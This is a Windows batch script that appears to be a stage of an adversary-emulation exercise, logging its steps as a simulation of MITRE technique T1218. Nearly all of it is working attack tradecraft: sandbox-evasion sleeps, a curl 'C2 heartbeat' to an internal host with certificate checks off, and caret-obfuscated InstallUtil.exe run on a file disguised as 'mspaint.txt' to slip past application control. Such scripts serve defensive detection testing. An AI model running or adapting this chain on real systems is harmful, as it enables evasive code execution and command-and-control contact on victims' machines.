@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable names for PHR_ constants
SET tkafd=%APPDATA%\8306\1bfc042d
SET pzlwj=https://10.0.0.49
SET vxhvn=https://10.0.0.49/stage/2/icon.png?8306-7
SET kmndb=ITZEL-S2BO
SET fhqcz=7
SET bcnvp=mspaint.txt
SET zgwsy=8306

REM Derived variables
SET logpath=%APPDATA%\!fhqcz!\macula-simulations.log
SET windirvar=W^I^N^D^I^R
SET netframe=%!windirvar!%\M^i^c^r^o^s^o^f^t.^N^E^T\F^r^a^m^e^w^o^r^k\v^4^.^0^.^3^0^3^1^9

REM Initial sandbox evasion delay
echo [!DATE! !TIME!][DEBUG][!kmndb!]: initial_delay_start=30s>> "!logpath!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!kmndb!]: initial_delay_complete=success>> "!logpath!" 2>nul

REM C2 Heartbeat - FIRST OPERATION
echo [!DATE! !TIME!][DEBUG][!kmndb!]: heartbeat_start=!vxhvn!>> "!logpath!" 2>nul
curl -k -s -o nul "!vxhvn!"
echo [!DATE! !TIME!][DEBUG][!kmndb!]: heartbeat_complete=!ERRORLEVEL!>> "!logpath!" 2>nul

REM Random delay
SET /A rnddelay=!RANDOM! %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!kmndb!]: random_delay_start=!rnddelay!s>> "!logpath!" 2>nul
timeout /t !rnddelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!kmndb!]: random_delay_complete=success>> "!logpath!" 2>nul

REM Change directory
echo [!DATE! !TIME!][DEBUG][!kmndb!]: chdir_start=!tkafd!>> "!logpath!" 2>nul
cd /d "!tkafd!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET cdres=success
) ELSE (
    SET cdres=failed
)
echo [!DATE! !TIME!][DEBUG][!kmndb!]: chdir_result=!cdres!>> "!logpath!" 2>nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!kmndb!]: operation_delay_start=10s>> "!logpath!" 2>nul
ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!kmndb!]: operation_delay_complete=success>> "!logpath!" 2>nul

REM Build obfuscated installutil command with variable fragmentation
SET cmdfrag1=i^n^s^t^a^l^l^u^t^i^l^.^e^x^e
SET cmdfrag2=/l^o^g^f^i^l^e^=
SET cmdfrag3=/L^o^g^T^o^C^o^n^s^o^l^e^=f^a^l^s^e
SET cmdfrag4=/^U

REM Execute installutil
echo [!DATE! !TIME!][DEBUG][!kmndb!]: installutil_start=!bcnvp!>> "!logpath!" 2>nul
"!netframe!\!cmdfrag1!" !cmdfrag2! !cmdfrag3! !cmdfrag4! "!bcnvp!"

REM Capture result for TTP logging
IF !ERRORLEVEL! EQU 0 (
    SET ttpresult=1
    SET ttpdetail=
) ELSE (
    SET ttpresult=0
    SET ttpdetail=execution_failed_error_!ERRORLEVEL!
)

REM Generate timestamp for TTP log
SET ttpstamp=
FOR /F "skip=1 delims=" %%a IN ('wmic os get localdatetime 2^>nul') DO (
    IF NOT DEFINED ttpstamp SET ttpstamp=%%a
)
IF DEFINED ttpstamp (
    SET ttp_year=!ttpstamp:~0,4!
    SET ttp_month=!ttpstamp:~4,2!
    SET ttp_day=!ttpstamp:~6,2!
    SET ttp_hour=!ttpstamp:~8,2!
    SET ttp_min=!ttpstamp:~10,2!
    SET ttp_sec=!ttpstamp:~12,2!
    SET ttp_ms=!ttpstamp:~15,3!
    SET ttp_timestamp=!ttp_year!-!ttp_month!-!ttp_day! !ttp_hour!:!ttp_min!:!ttp_sec!.!ttp_ms!
) ELSE (
    SET ttp_timestamp=!DATE! !TIME!
)

REM Log TTP execution
echo [!ttp_timestamp!][!kmndb!]: !fhqcz!-!zgwsy!-T1218|Signed Binary Proxy Execution (InstallUtil)=!ttpresult!::!ttpdetail!>> "!logpath!" 2>nul
echo [!DATE! !TIME!][DEBUG][!kmndb!]: ttp_logged=T1218_result_!ttpresult!>> "!logpath!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!kmndb!]: final_delay_start=15s>> "!logpath!" 2>nul
CHOICE /C Y /N /D Y /T 15 >nul
echo [!DATE! !TIME!][DEBUG][!kmndb!]: final_delay_complete=success>> "!logpath!" 2>nul